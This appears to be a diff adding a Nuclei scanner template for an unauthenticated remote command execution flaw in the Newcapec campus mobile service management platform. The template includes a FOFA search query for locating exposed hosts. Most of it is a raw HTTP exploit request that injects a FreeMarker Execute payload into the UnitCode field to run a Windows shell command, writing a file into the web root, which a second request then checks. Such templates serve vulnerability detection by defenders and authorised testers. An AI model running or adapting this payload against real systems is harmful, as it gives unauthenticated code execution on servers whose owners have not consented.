@@ -1,0 +1,38 @@
+
+id: newcapec-CampusMobileServiceManagementPlatform-RCE
+info:
+  name: 新开普掌上校园服务管理平台service.action远程命令执行漏洞
+  author: fgz
+  severity: high
+  description: '新开普掌上校园服务管理平台/service_transport/service.action接口处存在远程命令执行漏洞，攻击者可在未经身份认证的情况下，调用后台接口，执行恶意系统命令。'
+  tags: 2023,xinkaipu,rce
+  metadata:
+    max-request: 3
+    fofa-query: title="掌上校园服务管理平台"
+    verified: true
+
+http:
+  - raw:
+      - |
+        POST /service_transport/service.action HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Cookie: JSESSIONID=6A13B163B0FA9A5F8FE53D4153AC13A4
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
+        
+        {
+          "command": "GetFZinfo",
+          "UnitCode": "<#assign ex = \"freemarker.template.utility.Execute\"
+          ?new()>${ex(\"cmd /c echo {{randstr}} >./webapps/ROOT/{{randstr}}.txt\")}"
+        }
+
+      - |
+        GET /{{randstr}}.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200 && contains(body_2, '{{randstr}}')"
